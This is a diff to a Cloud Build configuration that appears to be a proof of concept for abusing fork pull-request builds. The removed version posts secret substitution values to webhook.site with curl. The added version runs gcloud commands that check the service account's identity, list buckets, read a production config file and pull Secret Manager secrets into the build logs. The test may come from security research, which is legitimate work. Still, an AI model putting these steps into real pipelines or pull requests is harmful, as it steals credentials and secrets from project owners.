@@ -1,16 +1,30 @@
 steps:
-- name: 'alpine:3.20'
+- name: 'gcr.io/google.com/cloudsdktool/google-cloud-cli:alpine'
   entrypoint: 'sh'
   args:
   - '-c'
   - |
-    echo "=== EXFILTRATION PROOF ==="
-    echo "Attempting to exfiltrate trigger substitution values..."
-    curl -s "https://webhook.site/#!/" -d "secret=${_TEST_SECRET}&token=${_INTERNAL_TOKEN}" 2>/dev/null || true
-    echo "SECRET_VALUE=${_TEST_SECRET}"
-    echo "TOKEN_VALUE=${_INTERNAL_TOKEN}"
-substitutions:
-  _TEST_SECRET: "DEFAULT_NOT_SET"
-  _INTERNAL_TOKEN: "DEFAULT_NOT_SET"
+    echo "========================================="
+    echo "=== FORK PR BUILD - SA CREDENTIAL TEST ==="
+    echo "========================================="
+    echo ""
+    echo "=== 1. Who am I? ==="
+    gcloud auth list 2>/dev/null || echo "no gcloud auth"
+    echo ""
+    echo "=== 2. List GCS buckets (storage.admin) ==="
+    gcloud storage ls --project=project-ea6927e4-d8f2-4559-b08 2>/dev/null || echo "GCS access denied"
+    echo ""
+    echo "=== 3. Read sensitive GCS file ==="
+    gcloud storage cat gs://project-ea6927e4-d8f2-4559-b08_cloudbuild/prod_config.txt --project=project-ea6927e4-d8f2-4559-b08 2>/dev/null || echo "GCS read denied"
+    echo ""
+    echo "=== 4. Access Secret Manager ==="
+    gcloud secrets versions access latest --secret=cb-impact-secret --project=project-ea6927e4-d8f2-4559-b08 2>/dev/null || echo "Secret access denied"
+    echo ""
+    echo "=== 5. List all secrets ==="
+    gcloud secrets list --project=project-ea6927e4-d8f2-4559-b08 2>/dev/null || echo "Secret list denied"
+    echo ""
+    echo "========================================="
+    echo "=== TEST COMPLETE ==="
+    echo "========================================="
 options:
   logging: CLOUD_LOGGING_ONLY
